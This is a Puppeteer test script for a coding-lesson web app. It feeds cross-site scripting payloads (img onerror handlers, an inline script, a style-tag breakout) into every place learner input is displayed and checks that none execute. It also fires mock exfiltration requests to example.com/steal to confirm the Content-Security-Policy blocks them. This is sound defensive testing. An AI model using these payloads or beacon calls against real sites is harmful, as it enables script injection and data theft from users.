/* injection-check.mjs: the web-app-security skill's step 3, done for every path at once.
   Hostile text goes through each place where something the learner types reaches the page.
   If any path renders it as HTML instead of text, the image's error handler trips a flag.
   Paths: program output, the variables panel, the stepper, error messages, the Check verdict,
   the code shown in other languages, the text-adventure console, and the HTML track's preview
   (which must stay sandboxed: the learner's own HTML may render there, but never run script). */
import fs from 'node:fs';
import puppeteer from 'puppeteer-core';
const chromium = (await import('@sparticuz/chromium')).default;

let pass = 0, fail = 0; const failures = [];
const ok = (n, c, d) => { if (c) pass++; else { fail++; failures.push(n + (d ? ' :: ' + d : '')); } };
const P = '<img src=x onerror="window.__pwn=(window.__pwn||0)+1">';

const browser = await puppeteer.launch({ executablePath: await chromium.executablePath(),
  args: [...(chromium.args || []), '--no-sandbox', '--disable-dev-shm-usage'], headless: 'shell' });
try {
  const page = await browser.newPage();
  await page.setViewport({ width: 393, height: 852, isMobile: true, hasTouch: true });
  const errors = [];
  page.on('pageerror', e => errors.push(String(e.message)));
  await page.goto('file://' + fs.realpathSync('./polyglot.html'), { waitUntil: 'load' });
  await new Promise(r => setTimeout(r, 400));
  const type = code => page.evaluate(c => { const e = document.getElementById('editor'); e.value = c;
    e.dispatchEvent(new Event('input', { bubbles: true })); }, code);
  const tripped = () => page.evaluate(() => ({ pwn: window.__pwn || 0, imgs: document.querySelectorAll('img[src="x"]').length }));
  const settle = () => new Promise(r => setTimeout(r, 250));
  const check = async (name) => { await settle(); const t = await tripped(); ok(name, t.pwn === 0 && t.imgs === 0, JSON.stringify(t)); };

  await page.evaluate(() => { window.loadLesson(0); window.setPhase('build'); window.loadTask(0); });
  const prog = 'msg = "' + P.replace(/"/g, '\\"') + '"\nprint(msg)\nprint("' + P.replace(/"/g, '\\"') + '")';

  /* 1. output, variables and stepping */
  await type(prog);
  await page.evaluate(() => document.getElementById('btnRun').click());
  await check('output-panel');
  ok('output-shows-the-text-literally', await page.evaluate(() => document.getElementById('panelOut').textContent.includes('<img src=x')),
    'the hostile text should appear, as text');
  await page.evaluate(() => document.getElementById('tabVars').click());
  await check('variables-panel');
  await page.evaluate(() => { for (let k = 0; k < 4; k++) document.getElementById('btnNext').click(); });
  await check('stepping-through');

  /* 2. the Check verdict quotes the learner's output back to them */
  await page.evaluate(() => { document.getElementById('tabOut').click(); document.getElementById('btnCheck').click(); });
  await check('check-verdict');

  /* 3. error messages */
  await type('print("' + P.replace(/"/g, '\\"') + '"');
  await page.evaluate(() => document.getElementById('btnRun').click());
  await check('error-message');

  /* 4. the same code shown in other languages */
  await type(prog);
  for (const lang of ['javascript', 'ruby', 'java', 'php']) {
    await page.evaluate(l => { const s = document.getElementById('langSel'); s.value = l; s.dispatchEvent(new Event('change', { bubbles: true })); }, lang);
    await check('shown-in-' + lang);
  }
  await page.evaluate(() => { const s = document.getElementById('langSel'); s.value = 'python'; s.dispatchEvent(new Event('change', { bubbles: true })); });

  /* 5. the text-adventure console echoes what the learner types */
  await type('name = input()\nprint("Hello " + name)');
  await settle();
  ok('console-appears-for-input-programs', await page.evaluate(() => document.getElementById('playPanel').style.display === 'block'), 'no console');
  await page.evaluate(p => { document.getElementById('playIn').value = p; document.getElementById('btnPlaySend').click(); }, P);
  await check('console-echo');
  ok('console-shows-the-text-literally', await page.evaluate(() => document.getElementById('playOut').textContent.includes('Hello <img')),
    await page.evaluate(() => document.getElementById('playOut').textContent.slice(0, 80)));

  /* 6. the HTML track renders the learner's HTML, so it must run in a sandbox without scripts */
  await page.evaluate(() => { window.setMarkupLesson(0); window.setPhase('build'); });
  const sandbox = await page.evaluate(() => document.getElementById('mPreview').getAttribute('sandbox'));
  ok('preview/sandboxed-without-scripts', sandbox !== null && !/allow-scripts/.test(sandbox), 'sandbox="' + sandbox + '"');
  await page.evaluate(() => {
    document.getElementById('paneHtml').click();
    const e = document.getElementById('mEditor');
    e.value = '<img src=x onerror="parent.__pwn=1;window.__inner=1"><script>parent.__pwn=1;window.__inner=1</script><h1>Toronto</h1>';
    e.dispatchEvent(new Event('input', { bubbles: true }));
    document.getElementById('paneCss').click();
    const c = document.getElementById('mEditor');
    c.value = 'h1{color:red}</style><img src=x onerror="parent.__pwn=1">';   // tries to break out of the style tag
    c.dispatchEvent(new Event('input', { bubbles: true }));
  });
  await new Promise(r => setTimeout(r, 600));
  await check('preview/parent-untouched');
  ok('preview/no-script-ran-inside', await page.evaluate(() => { const w = document.getElementById('mPreview').contentWindow; return !w.__inner; }), 'a script ran in the preview');
  ok('preview/still-renders-their-html', await page.evaluate(() => !!document.getElementById('mPreview').contentDocument.querySelector('h1')),
    'the learner\'s own HTML should still render');

  /* 7. the Content-Security-Policy: even a successful injection would have nowhere to send data */
  const csp = await page.evaluate(async () => {
    const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
    const firstScript = document.querySelector('script');
    const before = !!meta && !!firstScript && !!(meta.compareDocumentPosition(firstScript) & Node.DOCUMENT_POSITION_FOLLOWING);
    let fetchBlocked = false;
    try { await fetch('https://example.com/steal?x=1', { mode: 'no-cors' }); } catch (e) { fetchBlocked = true; }
    const imgBlocked = await new Promise(res => {
      const t = setTimeout(() => res(false), 2000);
      document.addEventListener('securitypolicyviolation', ev => { if (/example\.com/.test(ev.blockedURI)) { clearTimeout(t); res(true); } }, { once: true });
      const i = new Image(); i.src = 'https://example.com/pixel.gif?x=1';
    });
    return { present: !!meta, beforeScripts: before, fetchBlocked, imgBlocked, policy: meta && meta.content };
  });
  ok('csp/present-before-any-script', csp.present && csp.beforeScripts, JSON.stringify(csp));
  ok('csp/blocks-outbound-fetch', csp.fetchBlocked, 'a fetch to another site went through');
  ok('csp/blocks-outbound-image', csp.imgBlocked, 'an image beacon to another site was not blocked');
  errors.splice(0);   // the deliberate violations above are expected; check the app itself stayed clean
  ok('no-page-errors', errors.length === 0, errors.slice(0, 3).join(' | '));
} finally { await browser.close(); }

console.log('\n=== INJECTION CHECK (real Chromium) ===');
console.log('assertions passed     : ' + pass);
console.log('assertions failed     : ' + fail);
if (failures.length) { console.log('\n--- failures ---'); failures.forEach(f => console.log('* ' + f)); }
process.exit(fail === 0 ? 0 : 1);
